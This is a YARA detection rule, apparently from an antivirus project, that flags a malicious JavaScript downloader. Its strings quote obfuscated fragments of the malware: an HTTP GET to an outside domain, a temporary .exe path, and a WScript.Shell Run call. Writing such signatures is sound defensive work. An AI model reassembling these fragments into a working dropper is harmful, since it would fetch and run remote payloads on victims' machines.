rule sig_20160328_b17ba7c56c0c6f4aabfba4cfcddd527b {
  meta:
    description = "datamaliciousorder - file 20160328_b17ba7c56c0c6f4aabfba4cfcddd527b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "be7e9a57b8d21a4eaa52d582145ba26cd5dd77729b6787a23c339e3d9503bc6c"

  strings:
    $s1  = "function Ezfoxt() {return Tlsbaledj[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"BJwabXMP8NRj.exe\";};" fullword ascii
    $s2  = "Nsdtobokyh[Iivxqmw](\"GET\", \"http://gettouronline.com/sd4la\", false);" fullword ascii
    $s3  = "do {WScript[Nakorowh](Mjedoqle() * 11)} while (Nsdtobokyh[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Tlsbaledj = function Ysajl() {return WScript[Dmnnwt](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Cplkfn(Tgyhutwfcx, Vsywtjcxw){return Tgyhutwfcx - Vsywtjcxw;};" fullword ascii
    $s6  = "function Tarmsyg(Rdninxhxmy){Tlsbaledj[\"Run\"](Rdninxhxmy, Pthyrul, Pthyrul);};" fullword ascii
    $s7  = "function Inmvrmpyam() {return ((Etwho == true) && (Etwho == Hjccjqbvm)) ? 1 : Pthyrul;};" fullword ascii
    $s8  = " while (Cfxkhmjxqk){" fullword ascii
    $s9  = "function Vosxdw(){return Dmnnwt;};" fullword ascii
    $s10 = "var Monwn = new this[\"Date\"]();" fullword ascii
    $s11 = "var Etwho = false;" fullword ascii
    $s12 = "Hjccjqbvm = true; " fullword ascii
    $s13 = "var Hjccjqbvm = false;" fullword ascii
    $s14 = "function Vqxxrexsuw()" fullword ascii
    $s15 = "function Mjedoqle(){return 22;};" fullword ascii
    $s16 = "return Cplkfn(Fuztawd, Gyziwbfzs);" fullword ascii
    $s17 = "function Mdbxkvwnec(Gjevimkt) {var Zkoijcf = (1, 2, 3, 4, 5, Gjevimkt); return Zkoijcf;};" fullword ascii
    $s18 = "var Abnrs = false;" fullword ascii
    $s19 = "Etwho = true; " fullword ascii
    $s20 = "function Dzdwr(){return Kjywjei;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}